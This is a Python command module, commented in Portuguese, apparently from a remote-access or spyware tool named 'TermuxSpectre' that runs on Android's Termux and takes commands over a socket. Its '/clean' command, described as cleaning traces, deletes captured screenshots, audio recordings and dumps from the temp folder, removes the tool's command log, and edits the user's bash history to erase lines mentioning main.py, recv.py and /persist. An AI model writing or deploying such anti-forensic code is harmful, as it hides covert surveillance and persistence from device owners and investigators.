import os
import shutil
import subprocess

NAME = "/clean"
DESC = "limpa rastros do projeto: /clean [tmp|logs|all]"

TMP = "/data/data/com.termux/files/usr/tmp"
PROJ = os.path.expanduser("~/TermuxSpectre")


def run(shell, args):
    alvo = args.strip().lower() or "all"
    linhas = []

    if alvo in ("tmp", "all"):
        linhas.append(_limpar_tmp())

    if alvo in ("logs", "all"):
        linhas.append(_limpar_logs())

    if alvo == "all":
        linhas.append(_limpar_cache())
        linhas.append(_limpar_historico())

    shell.socket.send(("\n".join(l for l in linhas if l) + "\n").encode())


def _limpar_tmp():
    padroes = ("shot_", "rec.m4a", "dump_", "screen_")
    removidos = 0
    try:
        for nome in os.listdir(TMP):
            if any(nome.startswith(p) or nome == p for p in padroes):
                try:
                    caminho = os.path.join(TMP, nome)
                    if os.path.isfile(caminho):
                        os.remove(caminho)
                        removidos += 1
                except Exception:
                    pass
    except Exception as e:
        return f"tmp: erro {e}"
    return f"tmp: {removidos} arquivo(s) removido(s)"


def _limpar_logs():
    alvo = os.path.join(PROJ, "commands.log")
    if os.path.exists(alvo):
        try:
            os.remove(alvo)
            return "logs: commands.log removido"
        except Exception as e:
            return f"logs: erro {e}"
    return "logs: nada para remover"


def _limpar_cache():
    removidos = 0
    try:
        for root, dirs, _ in os.walk(PROJ):
            for d in list(dirs):
                if d == "__pycache__":
                    try:
                        shutil.rmtree(os.path.join(root, d))
                        removidos += 1
                        dirs.remove(d)
                    except Exception:
                        pass
    except Exception as e:
        return f"cache: erro {e}"
    return f"cache: {removidos} __pycache__ removido(s)"


def _limpar_historico():
    hist = os.path.expanduser("~/.bash_history")
    if not os.path.exists(hist):
        return "historico: nao existe"
    try:
        with open(hist) as f:
            linhas = f.readlines()
        filtradas = [
            l for l in linhas
            if "main.py" not in l and "recv.py" not in l and "/persist" not in l
        ]
        with open(hist, "w") as f:
            f.writelines(filtradas)
        removidas = len(linhas) - len(filtradas)
        return f"historico: {removidas} linha(s) removida(s)"
    except Exception as e:
        return f"historico: erro {e}"
